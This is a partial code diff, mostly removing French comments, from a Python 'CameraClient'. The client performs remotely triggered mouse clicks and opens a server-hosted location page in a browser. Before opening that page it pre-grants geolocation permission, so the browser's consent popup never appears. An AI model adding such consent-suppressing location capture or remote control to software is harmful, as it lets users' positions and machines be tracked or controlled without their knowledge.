                 logger.warning("Clic pynput impossible (%s, %s) : %s — repli", x, y, exc)
 
-        # 3. Repli ctypes / xdotool.
         if platform.system() == "Windows":
             if self._click_mouse_ctypes(x, y):
                 logger.info("Clic exécuté (ctypes) : (%s, %s)", x, y)
@@ -1014,7 +1141,6 @@ class CameraClient:
             logger.error("Clic impossible (Windows) : (%s, %s)", x, y)
             return
 
-        # Linux : xdotool (X11 uniquement ; Wayland natif non supporté).
         try:
             subprocess.run(
                 ["xdotool", "mousemove", str(int(x)), str(int(y))],
@@ -1032,15 +1158,11 @@ class CameraClient:
     # Navigateur de localisation
     # ------------------------------------------------------------------
     def _open_location_browser(self) -> None:
-        """Ouvre, chez CE client, un navigateur sur la page de localisation
-        du serveur (qui demande la position précise via navigator.geolocation
-        et la renvoie elle-même au serveur — ce client ne calcule rien)."""
+        """Ouvre, chez CE client, un navigateur sur la page de localisation."""
         url = f"{self.server_url}/location/page?device_id={self.device_id}"
         browser_path = _find_app_mode_browser()
         try:
             if browser_path:
-                # Pré-autorisation AVANT ouverture : le popup natif de
-                # géolocalisation n'apparaît alors jamais, dès le premier lancement.
                 _grant_geolocation_permission(LOCATION_PROFILE_DIR, self.server_url)
                 self._location_process = subprocess.Popen([
                     browser_path,
@@ -1052,15 +1174,11 @@ class CameraClient:
                     "--no-default-browser-check",
                 ])
             else:
-                # Repli : navigateur par défaut. Fonctionne pour OUVRIR, mais
-                # sans prise sur le processus on ne pourra pas le FERMER à
-                # distance (seul l'utilisateur, ou lui-même, pourra fermer l'onglet).
                 webbrowser.open(url, new=1)
                 self._location_process = None
                 logger.warning(
-                    "Aucun navigateur en mode « app » (Chrome/Edge/Chromium) trouvé : ouverture "
-                    "dans le navigateur par défaut. La fermeture à distance depuis le server-gui "
-                    "ne sera pas possible dans ce cas."
+                    "Aucun navigateur en mode « app » trouvé : ouverture dans le navigateur "
+                    "par défaut. Fermeture à distance impossible dans ce cas."
                 )
             self.location_open = True
             logger.info("Navigateur de localisation ouvert (%s)", url)
@@ -1068,10 +1186,6 @@ class CameraClient:
             logger.error("Impossible d'ouvrir le navigateur de localisation : %s", exc)
 
     def _close_location_browser(self) -> None:
-        """Ferme le navigateur ouvert par _open_location_browser, s'il a été
-        lancé via subprocess (donc si un navigateur en mode --app était
-        disponible). Sans ce process (repli webbrowser.open), rien à fermer
-        depuis ici : on se contente de mettre à jour l'état local."""
         self.location_open = False
         process = self._location_process
         self._location_process = None
@@ -1113,7 +1227,7 @@ class CameraClient:
                 timeout=REQUEST_TIMEOUT,
             )
         except requests.RequestException:
-            pass  # on retentera avec la dernière image disponible
+            pass
 
 
 def parse_args() -> argparse.Namespace:
